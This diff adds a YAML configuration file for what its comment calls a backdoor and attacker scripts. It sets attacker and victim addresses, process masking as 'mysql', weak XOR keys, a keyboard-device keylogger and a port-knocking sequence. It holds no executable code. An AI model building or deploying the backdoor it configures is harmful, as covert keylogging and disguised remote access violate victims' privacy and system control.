@@ -1,0 +1,33 @@
+# Config file used by both the backdoor and attacker scripts
+# Note: Separate the config files for the future.
+version: 1
+
+# Backdoor and Client
+attacker_ip: '192.168.0.0'
+attacker_iface: 'eth1'
+victim_ip: '192.168.0.1'
+protocol: 'udp'
+command_output: 'commands.txt'
+
+# Mask the process
+psmask: 'mysql'
+
+# Encryption
+header_key: 'T'
+xor_key: 'P'
+EOL: '[END]'
+
+# Keylogger files
+kbd_file: '/dev/input/by-path/<event-kbd>'
+keylog_file: 'keylogs.txt'
+
+# Port knocker
+port_list:
+  - 7005
+  - 8005
+  - 8505
+open_port: 8006
+timer: 5
+
+# File to Monitor
+monitor_file: 'file.txt'
